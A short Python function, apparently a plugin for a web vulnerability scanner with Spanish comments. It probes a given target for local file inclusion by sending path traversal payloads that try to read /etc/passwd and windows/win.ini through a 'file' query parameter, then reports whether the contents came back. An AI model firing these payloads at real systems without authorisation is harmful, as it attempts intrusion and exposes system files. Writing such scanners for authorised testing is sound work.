import requests

def run(objetivo):
    url = objetivo if objetivo.startswith("http") else f"http://{objetivo}"
    # Intentamos saltar directorios para leer el archivo hosts de Windows o passwd de Linux
    payloads = ["../../../../../../../../windows/win.ini", "../../../../../../../../etc/passwd"]
    
    try:
        for p in payloads:
            res = requests.get(f"{url}/?file={p}", timeout=3)
            if "bit mapping" in res.text.lower() or "root:x:" in res.text.lower():
                return f"🚨 CRÍTICO: LFI/Path Traversal detectado usando [{p}]."
        return "No se detectó exposición de archivos locales (LFI)."
    except:
        return "Error en prueba LFI."